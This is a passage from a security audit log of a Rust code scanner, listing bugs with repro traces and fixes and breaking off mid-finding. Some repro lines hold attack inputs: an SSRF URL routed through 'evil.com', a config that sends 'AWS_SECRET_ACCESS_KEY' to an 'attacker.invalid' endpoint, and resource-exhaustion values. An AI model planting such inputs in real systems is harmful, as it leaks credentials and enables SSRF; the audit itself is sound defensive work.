# ShellMind-Guard — Master Deep Audit Log (`AUDIT 1.1`)

> **Repository:** `/home/km-abdullah/ShellMind-Guard`
> **Mode:** Read-Only Deep Audit (no source code modified)
> **Progress:** 100% COMPLETE — ALL 92/92 PROD `.rs` FILES + ALL 50 NON-RUST FILES (Form 1–10 + `secrets_config.rs` Addendum + Master Rollup)

---

## Form 1 — Core Engine, Delta Cache & OSV Advisory Store (`crates/smg-core`)

- **Scope:** 6 Rust source files in `crates/smg-core/src/` (2,462 LOC, 100% read line 1 to EOF)
- **Totals:** **19 findings** — **1 P0**, **7 P1**, **7 P2**, **4 P3** (1 file `CLEAN`, 5 files with findings)

### 1.1 Executive Summary

All 6 files in `crates/smg-core` (2,462 lines) were audited line-by-line across all 6 mandatory lenses (Panic/Crash/DoS, Mathematical & Analytical Soundness, Self-Security, Concurrency & Resource Leaks, Performance & Scaling, Silent Failures & Dead Logic) and the Form 1 checklist.

- **Highest-Impact Risks:**
  1. **P0 Loopback Guardrail Bypass (`config.rs:154-169`):** `SandboxConfig::loopback_port()` strips `"[::1]"` and silently ignores trailing characters not starting with `':'`, accepting `http://[::1]@evil.com` as `Ok(Some(80))`.
  2. **P1 Distro OSV Advisory Drop & Version Math Failures (`advisories.rs`):** `canonical_ecosystem()` rejects versioned OSV ecosystem names (`Debian:12`, `Alpine:v3.19`, `Ubuntu:22.04`), silently dropping 100% of real Linux distro advisories on import; `parse_semver_key()` fails on Debian epochs (`1:3.0.11-...`), strips `+debNuM` patch suffixes, inverts `~` tilde ordering, compares Alpine `-r15` lexically (`"r15" < "r2"`), drops 4th version components, and mathematically inverts Go `vX.Y.Z-0.<ts>-<hash>` pseudo-versions.
  3. **P1 Test-File Indexing Blindspot (`scanner.rs:264-284, 373-405`):** `scan_repository_with_options()` and `should_visit_entry()` unconditionally skip `__tests__/`, `testdata/`, and 28 test filename patterns regardless of `INCLUDE_TESTS`, breaking `--include-tests` and dropping secret/credential leak checks in those test files.
  4. **P1 Quadratic `O(N^2)` Memory DoS & IaC YAML Parsing Bugs (`yaml.rs`):** `split_yaml_documents_preserving_lines()` allocates `O(N^2)` blank lines across multi-document YAML streams (~10 GB RAM from a <1 MiB file), while `parse_structural_yaml_entries()` wipes inline anchored scalars (`privileged: &p true` -> `""`) and mis-parses colon-containing list items (`- https://...`, `- arn:aws:iam::*:root`) as key-value pairs.
  5. **P1 Untrusted Repo Config Resource DoS & Trust Boundary (`config.rs:298-308`):** `.shellmind-guard.toml` is loaded with unclamped `scan.max_threads` (Rayon thread-exhaustion DoS), unclamped `scan.max_file_bytes` (OOM), and unguarded `[ai]` endpoint/API-key env settings.

### 1.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F1-01] `P0` — SSRF / Loopback Guardrail Bypass via IPv6 Bracket Suffix in `SandboxConfig::loopback_port`
- **Location:** `crates/smg-core/src/config.rs:154-169` (`SandboxConfig::loopback_port`)
- **Root Cause:** `authority.strip_prefix("[::1]")` followed by `after_bracket.strip_prefix(':').unwrap_or("")` silently discards any non-empty suffix not starting with `':'`, returning `host = "::1"` and `port_str = ""` (`Ok(Some(default_port))`).
- **Minimal Repro / Trigger Trace:** `[sandbox]\nbase_url = "http://[::1]@evil.com/api"` -> `authority = "[::1]@evil.com"` -> `after_bracket = "@evil.com"` -> `port_str = ""` -> returns `Ok(Some(80))`, while RFC 3986 clients treat `[::1]` as userinfo and connect to `evil.com:80`.
- **Surgical Fix:** Split `rest` on `['/', '?', '#']`, reject `@` in `authority`, require `after_bracket` to be empty or start with `':'`, and reject port `0`.

#### P1 — Real Bug / High FP or FN

##### [F1-02] `P1` — Hardcoded Test-File Skipping Ignores `--include-tests` and Drops Secret Scans in Test Files
- **Location:** `crates/smg-core/src/scanner.rs:264-284` (`should_visit_entry`) & `crates/smg-core/src/scanner.rs:373-405` (`scan_repository_with_options`)
- **Root Cause:** `should_visit_entry()` unconditionally prunes `__tests__` and `testdata`, and `scan_repository_with_options()` unconditionally skips 28 test filename patterns (`*_test.go`, `*.test.ts`, `*_test.rs`, `*_test.py`, `test_*.py`, `*Test.java`, etc.) without checking `INCLUDE_TESTS` or `ScanOptions`, contradicting `is_test_source_path()`'s guarantee to preserve secret/credential leak checks in test paths.
- **Minimal Repro / Trigger Trace:** Place a live secret in `src/auth_test.go` or `__tests__/config.test.ts` and scan with `set_include_tests(true)` -> neither file is indexed or scanned.
- **Surgical Fix:** Remove the unconditional test-directory/filename skips from `should_visit_entry()` and `scan_repository_with_options()` (or gate behind an opt-in `ScanOptions` flag defaulting to `false`) so downstream scanners handle test filtering via `is_test_source_path()` while keeping secret detection active.

##### [F1-03] `P1` — `canonical_ecosystem` Rejects Versioned OSV Linux Distro Ecosystems (100% FN)
- **Location:** `crates/smg-core/src/advisories.rs:27-47` (`canonical_ecosystem`) & `538-540` (`parse_osv_value_into_records`)
- **Root Cause:** Real OSV feeds encode distro ecosystems with `:release` suffixes (`Debian:12`, `Ubuntu:22.04:LTS`, `Alpine:v3.19`, `Rocky Linux:9`, `AlmaLinux:9`, `Red Hat:enterprise_linux:9`). `canonical_ecosystem()` matches only bare names and returns `None`, causing `parse_osv_value_into_records()` to drop every distro advisory.
- **Minimal Repro / Trigger Trace:** OSV record with `"ecosystem": "Debian:12"` -> `canonical_ecosystem("Debian:12")` returns `None` -> `parse_osv_value_into_records` returns `Ok(vec![])`.
- **Surgical Fix:** Strip the `:release` suffix before matching (and optionally store the distro release qualifier separately to prevent cross-release mismatches).

##### [F1-04] `P1` — Ecosystem Version Parsing Failures (Debian Epochs & `+deb`, Tilde `~`, Alpine `-rN`, 4-Part Versions)
- **Location:** `crates/smg-core/src/advisories.rs:87-175` (`parse_semver_key`, `cmp_prerelease_ident`, `cmp_semver_keys`)
- **Root Cause:** (1) Debian/Ubuntu epochs (`1:3.0.11-1~deb12u2`): `"1:3".parse::<u64>()` returns `None` -> 100% FN. (2) Debian `+debNuM` (`1.1.1w-0+deb11u1` vs `1.1.1w-0+deb11u2`): `split(['+', ...])` strips `+deb...` -> keys compare `Equal` -> 100% FN. (3) Debian `~` (`1.0-1~deb12u1` vs `1.0-1`): `1~deb12u1` sorts `>` `1` (inverted). (4) Alpine `-r15` vs `-r2`: lexical `"r15" < "r2"` -> FP on patched Alpine packages (`r10+`). (5) 4-part versions (`1.2.3.4` vs `1.2.3.5`): 4th segment silently dropped -> FN.
- **Minimal Repro / Trigger Trace:** `version_matches_range("Debian", "1:3.0.11-1~deb12u1", "0", "1:3.0.11-1~deb12u2", "")` -> `false` (FN); `version_matches_range("Alpine", "1.36.1-r15", "0", "1.36.1-r2", "")` -> `true` (FP).
- **Surgical Fix:** Dispatch `version_matches_range` by ecosystem with dedicated dpkg and apk comparators, retain 4th+ numeric segments in `SemverKey`, and compare alphanumeric prerelease tokens numerically (`r2 < r15`, `a2 < a10`).

##### [F1-05] `P1` — Go Pseudo-Version Precedence Is Mathematically Inverted
- **Location:** `crates/smg-core/src/advisories.rs:119-128` (`parse_semver_key`) & `183-198` (`is_go_pseudo_version`, `version_matches_range`)
- **Root Cause:** `v1.2.3-0.20230101120000-abcdef` is assigned `tier = 2` (AFTER `1.2.3`), whereas per Go Modules / SemVer 2.0.0 it is a pre-release BEFORE `1.2.3` (commits after `v1.2.2`). Also, returning `false` unconditionally for all `0.0.0-...` pseudo-versions drops `golang.org/x/*` advisories whose `fixed` is itself a `0.0.0-...` timestamp pseudo-version.
- **Minimal Repro / Trigger Trace:** Installed `v1.2.3-0.20230101120000-abcdef123456` with `fixed = "1.2.3"` -> `tier 2 > tier 1` -> returns `false` (FN). With `introduced = "1.2.3"`, `fixed = "1.2.4"` -> returns `true` (FP).
- **Surgical Fix:** Remove `(pre_norm.starts_with("0.") && pre_norm.len() >= 18)` from `is_post_tag` so Go `-0.<ts>-<hash>` remains `tier = 0`; update the inverted test at line 790; compare timestamps when both installed and fixed are `0.0.0-...` Go pseudo-versions.

##### [F1-06] `P1` — Quadratic `O(N^2)` Memory Allocation DoS in `split_yaml_documents_preserving_lines`
- **Location:** `crates/smg-core/src/yaml.rs:28-54` (`split_yaml_documents_preserving_lines`)
- **Root Cause:** Line 38 prepends `vec![""; cur_lines.len() + 1]` blank lines to every subsequent document, causing `O(D^2)` memory allocation across `D` documents.
- **Minimal Repro / Trigger Trace:** A ~900 KB YAML file with 100,000 `a: 1\n---\n` documents allocates ~10 GB of RAM and OOMs.
- **Surgical Fix:** Return `(start_line, &str)` document slices instead of materializing leading blank lines, and pass `start_line` into `parse_structural_yaml_entries`.

##### [F1-07] `P1` — YAML Parser Wipes Inline Anchored Scalars & Mis-Parses Colon-Containing List Items
- **Location:** `crates/smg-core/src/yaml.rs:122-140` (`parse_structural_yaml_entries`)
- **Root Cause:** (1) `val.strip_prefix('&')` calls `val.clear()` unconditionally, erasing inline scalar values (`privileged: &p true` -> `""`), and scalar aliases (`privileged: *p`) are never expanded. (2) `body.split_once(':')` splits on any `:` instead of `": "` / trailing `:`, mis-parsing `- https://...` and `- arn:aws:iam::*:root` as mapping keys (`key = "https"` / `"arn"`) instead of list values.
- **Minimal Repro / Trigger Trace:** `privileged: &p true\nother: *p` emits `("privileged", "")` and `("other", "*p")`; `- arn:aws:iam::*:root` emits `key = "arn", value = "aws:iam::*:root"`.
- **Surgical Fix:** Split on `:` only when followed by whitespace or EOL outside quotes; preserve scalar values after `&anchor` in a `scalar_anchors` map and expand `*alias` references.

##### [F1-08] `P1` — Untrusted Repo `.shellmind-guard.toml` Allows Thread/Memory DoS & Unvalidated `[ai]` Config
- **Location:** `crates/smg-core/src/config.rs:298-308` (`ShellMindGuardConfig::load_from_dir`) & `crates/smg-core/src/scanner.rs:420-443`
- **Root Cause:** `load_from_dir()` accepts unclamped `scan.max_threads` (Rayon thread exhaustion), unclamped `scan.max_file_bytes` (`u64::MAX` -> OOM on `fs::read`), and `[ai]` (`endpoint`, `api_key_env`) from untrusted repos without trust-boundary filtering.
- **Minimal Repro / Trigger Trace:** Untrusted repo `.shellmind-guard.toml` with `max_threads = 1000000` or `max_file_bytes = 18446744073709551615` or `[ai]\nendpoint = "https://attacker.invalid"\napi_key_env = "AWS_SECRET_ACCESS_KEY"`.
- **Surgical Fix:** Clamp `max_threads` (`1..=64`) and `max_file_bytes` (`<= 64 MiB`) in `load_from_dir()`, and strip `sandbox.boot_cmd`, `sandbox.base_url`, and `ai` unless `--trust-repo-config` is explicitly enabled.

#### P2 — Edge Case / Perf / Resource Leak

##### [F1-09] `P2` — Process-Global `INCLUDE_TESTS` `AtomicBool` Race
- **Location:** `crates/smg-core/src/scanner.rs:210-223` (`INCLUDE_TESTS`, `set_include_tests`, `is_test_source_path`)
- **Root Cause:** Process-wide `AtomicBool` causes races across parallel tests and concurrent library/MCP scans.
- **Surgical Fix:** Move `include_tests: bool` into `ScanOptions` / scan context.

##### [F1-10] `P2` — Multi-Byte UTF-8 Truncation in `has_generated_header`, Missing Binary Detection & TOCTOU File Read
- **Location:** `crates/smg-core/src/scanner.rs:202-208` & `430-455`
- **Root Cause:** `std::str::from_utf8(&bytes[..bytes.len().min(512)]).unwrap_or("")` returns `""` if byte 512 bisects a multi-byte UTF-8 character; no NUL-byte binary check exists; separate `metadata` + `fs::read` allows TOCTOU growth past `limit`.
- **Surgical Fix:** Use `String::from_utf8_lossy`, read via `File::open` + `take(limit + 1)`, and skip files with NUL bytes in the first 8 KiB.

##### [F1-11] `P2` — Non-Transactional SQLite Schema Migration Race & Predictable `/tmp` Fallback
- **Location:** `crates/smg-core/src/store.rs:31-40` (`cache_base_dir`) & `66-137` (`StateStore::open`)
- **Root Cause:** Schema migration runs outside a transaction (concurrent first-open `ALTER TABLE` collision), and `temp_dir()` fallback creates a shared predictable `/tmp/shellmind-guard` path when `HOME`/`XDG_CACHE_HOME` are unset.
- **Surgical Fix:** Wrap migration in an `IMMEDIATE` transaction (re-checking `user_version`), and scope the `temp_dir()` fallback per-UID with `0o700` permissions on Unix.

##### [F1-12] `P2` — PyPI Package Normalization Violates PEP 503 on Repeated Separators
- **Location:** `crates/smg-core/src/advisories.rs:50-58` (`normalize_package_name`)
- **Root Cause:** `lower.replace(['_', '.'], "-")` produces `"foo--bar"` for `"foo__bar"` instead of collapsing runs of `[-_.]+` to a single `"-"`.
- **Surgical Fix:** Collapse consecutive `'-' | '_' | '.'` into a single `'-'`.

##### [F1-13] `P2` — YAML Escaped-Backslash Quote Bug, Quoted-Comma Split & Dropped Chained/Array Anchor Merges
- **Location:** `crates/smg-core/src/yaml.rs:12`, `62-68`, `143-167`
- **Root Cause:** `bytes[i-1] != b'\\'` mishandles `"C:\\" # comment`; `inner.split(',')` splits quoted commas `["a,b", "c"]`; `continue` at line 156 skips recording chained `<<: *a` merges into `&b`; `<<: [*a, *b]` array merges are ignored.
- **Surgical Fix:** Track `escaped: bool` in comment stripping; use quote-aware list splitting; support `<<: [*a, *b]` and propagate merged keys into `current_anchor` with a per-anchor entry cap (e.g., 1,024).

##### [F1-14] `P2` — `scan_repository_metadata_signature` Filter Drift from `scan_repository_with_options`
- **Location:** `crates/smg-core/src/scanner.rs:487-542`
- **Root Cause:** Watch-mode metadata signature does not apply generated-file/test-file filters or `canon_file.starts_with(&canon_root)`, causing spurious full rescans on edits to ignored/generated files.
- **Surgical Fix:** Share one candidate-filtering helper between `scan_repository_with_options()` and `scan_repository_metadata_signature()`.

##### [F1-15] `P2` — Coarse CVSS v3 Severity Heuristic & `upsert_advisories` Skipped-Row Miscount
- **Location:** `crates/smg-core/src/advisories.rs:326-361` & `475-494`
- **Root Cause:** `cvss_vector_to_severity()` defaults all non-`C:H/I:H/A:H` CVSS v3 vectors to `"HIGH"` (even LOW 1.8) while marking `AV:L/.../C:H/I:H/A:H` (MEDIUM 6.3) as `"CRITICAL"`; `upsert_advisories()` returns `records.len()` even when empty `id`/`pkg` rows are skipped.
- **Surgical Fix:** Compute the standard CVSS v3.1 base score and return the actual count of executed upserts.

#### P3 — Hygiene / Dead Logic

##### [F1-16] `P3` — `skipped_ignored_or_binary` Undercount & Per-Entry `format!` Allocation
- **Location:** `crates/smg-core/src/scanner.rs:319-323` & `430-455`
- **Root Cause:** Oversized/unreadable/symlink-escaped files return `None` without incrementing `skipped`; `format!("{}/", clean)` allocates per entry × ignore pattern.
- **Surgical Fix:** Increment `skipped` before early `return None` and use `rel_norm.strip_prefix(clean).is_some_and(|r| r.starts_with('/'))`.

##### [F1-17] `P3` — Duplicate FTS5 Rows on Duplicate Finding IDs & Unbounded `scans` Table
- **Location:** `crates/smg-core/src/store.rs:292-308` (`StateStore::save_findings`)
- **Root Cause:** `INSERT OR REPLACE` on `findings` vs plain `INSERT` on `findings_fts` can insert duplicate FTS rows if duplicate `id`s are passed.
- **Surgical Fix:** Deduplicate `rows` by `id` before inserting into `findings_fts`.

##### [F1-18] `P3` — `detect_and_write_init` Silently Overwrites Existing `.shellmind-guard.toml`
- **Location:** `crates/smg-core/src/config.rs:310-335`
- **Root Cause:** Unconditionally calls `fs::write(&out_path, toml_str)?` without checking `out_path.exists()`.
- **Surgical Fix:** Guard with `if out_path.exists()` or take a `force: bool` flag.

##### [F1-19] `P3` — Case-Sensitive `Dockerfile` Match & Silent `mtime_ns` `u128 as i64` Wrap
- **Location:** `crates/smg-core/src/scanner.rs:82-84` & `448, 530`
- **Root Cause:** Bare lowercase `dockerfile` is unindexed; `d.as_nanos() as i64` wraps for timestamps past year 2262.
- **Surgical Fix:** Match `low_fname == "dockerfile" || low_fname.starts_with("dockerfile.")` and clamp via `i64::try_from(d.as_nanos()).unwrap_or(i64::MAX)`.

### 1.3 Per-File Verdict Table (Form 1)

| File | LOC | Verdict | Finding IDs |
| --- | ---: | --- | --- |
| `crates/smg-core/src/lib.rs` | 17 | `CLEAN — verified line-by-line` | — |
| `crates/smg-core/src/scanner.rs` | 626 | `FINDINGS: 6` | F1-02, F1-09, F1-10, F1-14, F1-16, F1-19 |
| `crates/smg-core/src/store.rs` | 399 | `FINDINGS: 2` | F1-11, F1-17 |
| `crates/smg-core/src/advisories.rs` | 839 | `FINDINGS: 5` | F1-03, F1-04, F1-05, F1-12, F1-15 |
| `crates/smg-core/src/config.rs` | 355 | `FINDINGS: 3` | F1-01, F1-08, F1-18 |
| `crates/smg-core/src/yaml.rs` | 226 | `FINDINGS: 3` | F1-06, F1-07, F1-13 |
| **Total (Form 1)** | **2,462** | **19 Findings (1 P0 · 7 P1 · 7 P2 · 4 P3)** | |

### 1.4 Cross-Cutting Observations (Form 1)

1. **Untrusted Repository Trust Boundary:** While symlink traversal in `scanner.rs` is well-defended (`follow_links(false)` + post-canonicalization prefix check), untrusted `.shellmind-guard.toml` limits (`max_threads`, `max_file_bytes`, `[ai]`), `SandboxConfig::loopback_port` authority parsing, and multi-document YAML memory expansion (`yaml.rs`) expose DoS or SSRF surfaces at this ingestion perimeter.
2. **Ecosystem-Specific Version Semantics:** Treating Debian, Ubuntu, Alpine, Go, PyPI, NuGet, and npm versions with a single 3-part SemVer parser produces compounding FNs/FPs in `advisories.rs`.
3. **Panic Hygiene:** Zero `.unwrap()` / `.expect()` / unchecked string-slice panics were found in non-test production code across all 6 files.

---

## Form 2 (Session 2A) — Multi-Language AST, CFG, Scope & Guard-Set Lattice (`crates/smg-graph` Core)

- **Scope:** 6 Rust source files in `crates/smg-graph/src/` (`lib.rs`, `arena.rs`, `ast.rs`, `cfg.rs`, `scope.rs`, `lattice.rs` — 9,664 LOC, 100% read line 1 to EOF)
- **Totals:** **23 findings** — **4 P0**, **11 P1**, **5 P2**, **3 P3**

### 2A.1 Executive Summary

- **Highest-Impact Risks:**
  1. **Fail-open route & guard proofs (`F2A-01`, `F2A-02`, `F2A-03`, `F2A-07`, `F2A-08`):** Common real-world patterns—putting `"/"` in `public_routes`, large functions hitting `max_cfg_blocks()`, a NestJS controller with one guarded method and one unguarded method, `if (debug) { sink(); } else if (!verifyJwt(req)) { return 401; }`, or a Go handler calling `http.Error(..., 401)` without `return`—cause the analyzer to prove `GuardKind::Auth` and silently suppress critical vulnerabilities.
  2. **Graph corruption on large monorepos (`F2A-05`, `F2A-06`):** Exceeding `SymbolArena`'s cap collapses all subsequent symbols onto `SymbolId(0)` while dropping their outgoing edges, and cyclic call graphs in `build_idor_unguarded_bfs_tree` create parent cycles that produce bogus 64-hop witness paths.
  3. **Crash / DoS vectors (`F2A-04`):** Zero `.unwrap()`/`.expect()`/`panic!()` in production code, but three recursive AST helpers lack depth bounds and can overflow the thread stack on deeply nested inputs.

### 2A.2 Findings (P0–P3)

#### P0 — Crash / Security / Soundness Break

##### [F2A-01] `P0` — `is_public_route` treats `"/"` in `public_routes` as a global wildcard suppressing auth, IDOR, and CSRF across the API
- **Location:** `crates/smg-graph/src/lattice.rs:96-113` (`is_public_route`)
- **Root Cause:** Line 111 checks `(!has_privileged_seg && low.starts_with(&format!("{}/", pl.trim_end_matches('/'))))`. When `pl == "/"`, `pl.trim_end_matches('/')` is `""`, so `format!("{}/", "")` evaluates to `"/"`, matching every route path starting with `"/"` unless it contains one of 7 hardcoded privileged segments (`admin`, `impersonate`, `refund`, `refund-all`, `users`, `billing`, `role`).
- **Minimal Repro / Trigger Trace:** Configure `public_routes = ["/"]` on an app with `POST /api/v1/transfer` or `GET /orders/:id`. `is_public_route("POST /api/v1/transfer", &["/"])` evaluates `low.starts_with("/")` -> `true`, suppressing `SMG-AUTH-001`, `SMG-IDOR-001`, and `SMG-CSRF-001`.
- **Surgical Fix:** Only apply prefix matching when `trimmed = pl.trim_end_matches('/')` is non-empty.

##### [F2A-02] `P0` — Unreachable CFG block-budget check (`>`) + `Option` `?` conflation truncates sinks and yields fail-open guard proofs
- **Location:** `crates/smg-graph/src/cfg.rs:118-121` (`compute_cfg_guard_dominance`) & `crates/smg-graph/src/cfg.rs:274-280` (`CfgBuilder::new_block`)
- **Root Cause:** `new_block()` returns `None` once `self.blocks.len() >= self.cfg.scan.max_cfg_blocks()`, making `builder.blocks.len() > cfg.scan.max_cfg_blocks()` dead code. `lower_if`, `lower_switch_or_match`, `lower_try`, and `lower_loop` propagate `None` via `?`, conflating budget exhaustion with unconditional exit, silently dropping trailing sinks, and running dominance analysis on the truncated CFG.
- **Minimal Repro / Trigger Trace:** A handler calling `requireAuth(req);` followed by a large `switch`/`if` chain reaching `max_cfg_blocks()` and an unlocked `balance -= amount;` aborts lowering before the sink and bypasses line 119.
- **Surgical Fix:** Add `budget_exceeded: bool` to `CfgBuilder` and return `entry_guards.to_set()` immediately when set.

##### [F2A-03] `P0` — NestJS `class_has_auth` scans the entire class body, leaking method-level `@UseGuards` or comments onto unauthenticated sibling routes
- **Location:** `crates/smg-graph/src/ast.rs:2268-2271` (`extract_single_node`, section `2a-nest`)
- **Root Cause:** `class_txt.contains("@UseGuards") && class_txt.contains("Auth")` inspects the full `class_declaration` text instead of only class-level decorators.
- **Minimal Repro / Trigger Trace:** A `@Controller("billing")` with `@Post("safe") @UseGuards(AuthGuard)` and an unguarded `@Post("unauth-payout")` grants `GuardKind::Auth` to `POST payout`, suppressing `SMG-AUTH-001`.
- **Surgical Fix:** Inspect only class-level decorator nodes, stripping comments and reusing `classify_guards(dtxt, cfg).contains(&GuardKind::Auth)`.

##### [F2A-04] `P0` — Unbounded recursive AST walkers can overflow the stack on deeply nested inputs
- **Location:** `crates/smg-graph/src/scope.rs:103-125` (`record_param_shadowing`), `crates/smg-graph/src/ast.rs:996-1022` (`find_inline_fn_node`), `crates/smg-graph/src/ast.rs:1102-1180` (`collect_go_mw_arg_recursive`)
- **Root Cause:** All three helpers recurse directly over AST children with no `depth` parameter or `MAX_AST_WALK_DEPTH` guard.
- **Minimal Repro / Trigger Trace:** Deeply nested destructuring parameters (`function f({a:{a:{...}}})`), deeply parenthesized route handlers, or nested Go middleware wrappers exhaust the 8 MiB Rayon worker stack (`lib.rs:84`).
- **Surgical Fix:** Pass `depth: usize` and return early at `MAX_AST_WALK_DEPTH` (or use an explicit heap worklist).

#### P1 — Real Bug / High FP or FN

##### [F2A-05] `P1` — `SymbolArena` budget cap returns `SymbolId(0)` for all overflow strings, causing sentinel collisions and silent edge drops
- **Location:** `crates/smg-graph/src/arena.rs:65-75` (`SymbolArena::intern`) & `crates/smg-graph/src/lattice.rs:536-573, 707`
- **Root Cause:** After `max_strings` (250k) or `max_bytes` (32 MiB), `intern()` returns `SymbolId(0)` without inserting into `lookup`, colliding all overflow symbols onto `(SymbolId(0), SymbolId(0))` while `arena.get(&sym.id)` returns `None` and silently drops all outgoing call-graph edges.
- **Surgical Fix:** Return `Option<SymbolId>` (or distinct `SymbolId::INVALID` never inserted into maps) and surface `budget_capped` in `GraphAnalysisResult`.

##### [F2A-06] `P1` — `build_idor_unguarded_bfs_tree` can create parent cycles, producing bogus 64-hop cyclic witnesses
- **Location:** `crates/smg-graph/src/lattice.rs:2353-2406` (`build_idor_unguarded_bfs_tree`) & `2508-2539` (`reconstruct_witness`)
- **Root Cause:** Overwriting `parent[vi] = Some(u)` when `!res_reaches[vi] && next_res` on an already-visited ancestor creates parent cycles (`A -> B -> A`), and `reconstruct_witness` has no `visited` set.
- **Surgical Fix:** Run BFS over 2-state product graph `(node, has_res: bool)` and add a `seen: HashSet<usize>` cycle guard to `reconstruct_witness`.

##### [F2A-07] `P1` — `early_cond_text_guards` scans the entire `if_node` text, letting an `else if` 401 guard bleed onto an unauthenticated `then` branch
- **Location:** `crates/smg-graph/src/cfg.rs:404-439` (`CfgBuilder::lower_if`) & `671-707` (`CfgBuilder::early_cond_text_guards`)
- **Root Cause:** `if_txt.contains("401")` spans the full `if ... else if ...` statement, so `if (req.query.debug) { sink(); } else if (!verifyJwt(req)) { return res.status(401).end(); }` falsely proves `Auth` on the `then` branch.
- **Surgical Fix:** Restrict the `"401"`/`"403"`/`"unauthorized"` check to `consequence` when `cond_is_negated` or `alternative` when `!cond_is_negated`.

##### [F2A-08] `P1` — `stmt_unconditionally_exits` treats Go `http.Error(...)` as returning, masking missing-`return` auth bypasses
- **Location:** `crates/smg-graph/src/cfg.rs:809-841` (`stmt_unconditionally_exits`)
- **Root Cause:** `http.Error(w, msg, code)` writes a response without returning; additionally, the string fallback matches nested `if` blocks inside `statement_block`.
- **Surgical Fix:** Remove `code.contains("http.error(")` and return `false` immediately for control-flow container node kinds before string fallbacks.

##### [F2A-09] `P1` — `stmt_direct_guards` grants `GuardKind::InputValidation` on any `.parse(` call, including `JSON.parse`
- **Location:** `crates/smg-graph/src/cfg.rs:799-804` (`CfgBuilder::stmt_direct_guards`)
- **Root Cause:** `stmt_code.contains(".parse(")` matches `JSON.parse`, `Date.parse`, `Number.parseInt`, and `URL.parse`.
- **Surgical Fix:** Exclude `json.parse(`, `date.parse(`, `url.parse(`, or match only schema validators (`schema.parse(`, `.safeparse(`, `zod`, `joi`, `yup`, `ajv`).

##### [F2A-10] `P1` — `lower_try` drops `finally` blocks when `try`/`catch` return, and `lower_loop` lowers loop headers as body statements while ignoring `break`
- **Location:** `crates/smg-graph/src/cfg.rs:587-650` (`CfgBuilder::lower_try`) & `652-669` (`CfgBuilder::lower_loop`)
- **Root Cause:** `lower_try` returns `None` before lowering `finally_node` when `surviving.is_empty()`; `lower_loop` lowers `loop_node` instead of its `body` field and never wires `break` to `join`.
- **Surgical Fix:** Always lower `finally_node` before returning `None`; lower `loop_node.child_by_field_name("body")` and preserve `join` reachability when `break` is present.

##### [F2A-11] `P1` — `scope.rs` JSX and variable XSS sanitizer checks are bypassable via comments or local-variable concatenation
- **Location:** `crates/smg-graph/src/scope.rs:175-211` (`contains_xss_sanitizer_call`, `has_direct_tainted_unsanitized_wrap`, `is_safe_jsx_html_attribute`)
- **Root Cause:** Raw substring checks (`low.contains("dompurify")`) without comment stripping or checking concatenated local tainted variables (`DOMPurify.sanitize(a) + raw`).
- **Surgical Fix:** Strip comments first and reject `+` / `${` outside sanitizer call arguments.

##### [F2A-12] `P1` — `FileScopeTable::var_receivers` is file-global and unrevoked on reassignment, causing cross-function receiver-type poisoning (FN) and forward-declaration misses (FP)
- **Location:** `crates/smg-graph/src/scope.rs:127-159` (`update_binding_from_rhs`) & `233-251` (`is_benign_local_receiver`)
- **Root Cause:** `var_receivers` persists across unrelated functions in the same file and is never cleared on parameter binding or non-local reassignment; single-pass `walk_scope` misses classes declared below their instantiation.
- **Surgical Fix:** Collect `local_classes` in a first pass and revoke `var_receivers.remove(var_name)` on parameter binding or non-local RHS assignment.

##### [F2A-13] `P1` — Unqualified fallback in `resolve_one` collides across unrelated sibling classes in the same file and shadows imports
- **Location:** `crates/smg-graph/src/lattice.rs:835-860` (`solve_guard_lattice_with_options`, closure `resolve_one`)
- **Root Cause:** When `scoped` is empty for an unqualified call `save()`, the `else if` fallback links to an unrelated `ClassB.save` in the same file and skips `file_imports`.
- **Surgical Fix:** Restrict fallback to `enclosing_type.is_none()` or matching `src_enclosing_ty_id` so imported free calls resolve via `file_imports`.

##### [F2A-14] `P1` — `--deep-audit` `max_witness_hops` (256) is ignored by `reconstruct_witness`, `can_improve_witness`, and `reconstruct_taint_witness`, and truncated witnesses drop their root
- **Location:** `crates/smg-graph/src/lattice.rs:499, 2297-2311, 2414-2435, 2508-2539`
- **Root Cause:** Hardcoded limits (`64` and `32`) ignore `cfg.scan.max_witness_hops()`; truncating mid-walk omits the entry route from `witness_path`.
- **Surgical Fix:** Thread `max_witness_hops` into all three helpers and prepend `root_idx` when truncated.

##### [F2A-15] `P1` — Cross-router `file_middleware_guards` leak in TS/JS & Go, and missed Rust Actix routes when multiple attributes are stacked
- **Location:** `crates/smg-graph/src/ast.rs:1950`, `2560-2585`, `2974-2976`
- **Root Cause:** `adminRouter.use(requireAuth)` / `r1.Use(AuthMiddleware())` mutates a file-wide `file_middleware_guards` set that bleeds onto `publicRouter` / `r2`; Actix route extraction checks only immediate `next_named_sibling()`, dropping routes with stacked attributes (`#[tracing::instrument]`).
- **Surgical Fix:** Key middleware guards by router receiver identifier (`HashMap<String, HashSet<GuardKind>>`) and walk siblings skipping attributes/comments until `function_item`.

#### P2 — Edge Case / Perf / Resource Leak

##### [F2A-16] `P2` — Super-quadratic `O(I * F * (log F + D))` import resolution in `find_known_suffix` / `resolve_extension_import`
- **Location:** `crates/smg-graph/src/ast.rs:3398-3416, 3451-3481`
- **Root Cause:** Sorts all `known_files` and allocates lowercased strings on every extension-language import.
- **Surgical Fix:** Precompute a normalized lowercase suffix index once per `solve_guard_lattice_with_options` call.

##### [F2A-17] `P2` — Quadratic `O((N + M) * M)` deduplication scan in `append_local_static_findings`
- **Location:** `crates/smg-graph/src/lattice.rs:2188-2240`
- **Root Cause:** Linear `findings.iter_mut().find(...)` per extra finding.
- **Surgical Fix:** Index existing findings in a temporary `HashMap<(String, String), usize>`.

##### [F2A-18] `P2` — Unnecessary full-codebase `FileAstSummary` clone in `analyze_codebase_cached_changed_since`
- **Location:** `crates/smg-graph/src/lib.rs:153-184`
- **Root Cause:** Line 175 deep-clones every `FileAstSummary` even when `full_fallback == true` and `all_summaries` is already owned.
- **Surgical Fix:** Pass `&all_summaries` directly when `full_fallback` is `true`.

##### [F2A-19] `P2` — `SymbolArena` under-counts string memory by >2× and truncates `usize` to `u32` on custom budgets
- **Location:** `crates/smg-graph/src/arena.rs:75-80`
- **Root Cause:** Stores two `String` copies (`strings` + `lookup`) while counting `owned.len()` once; casts `len() as u32` without `u32::MAX` cap.
- **Surgical Fix:** Use `Arc<str>` or `IndexSet<String>` and cap `max_strings` at `u32::MAX as usize`.

##### [F2A-20] `P2` — CFG dataflow initializes `out_bits` to `EMPTY` instead of `TOP` with flawed reachability proxy; middleware/CHA propagation caps at 2 iterations
